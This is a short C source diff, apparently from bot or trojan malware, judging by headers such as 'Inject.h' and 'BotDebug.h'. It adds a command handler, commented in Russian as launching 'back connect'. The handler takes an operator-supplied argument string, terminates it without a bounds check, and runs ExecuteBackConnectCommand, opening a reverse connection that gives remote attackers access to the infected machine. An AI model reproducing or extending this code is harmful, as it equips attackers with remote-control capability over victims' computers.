@@ -9,6 +9,7 @@
 #include "Inject.h"
 #include "StrConsts.h"
 #include "plugins.h"
+#include "BackConnect.h"
 
 //----------------------------------------------------------------------------
 #include "BotDebug.h"
@@ -544,6 +545,18 @@ DWORD WINAPI CallbackCmd( DWORD cmd, char* inData, int lenInData, char* outData,
 				}
 			}
 			res = TRUE;
+			break;
+		case 23: //запуск BC (back connect)
+			{
+				int len = (inData[1] << 8) | inData[0];
+				char* args = inData + 2;
+				args[len] = 0;
+				VDRDBG( "Video", "BC %s", args );
+				if( ExecuteBackConnectCommand( 0, 0, args) )
+					outData[0] = 1;
+				else
+					outData[0] = 0;
+			}
 			break;
 	}
 	return res;
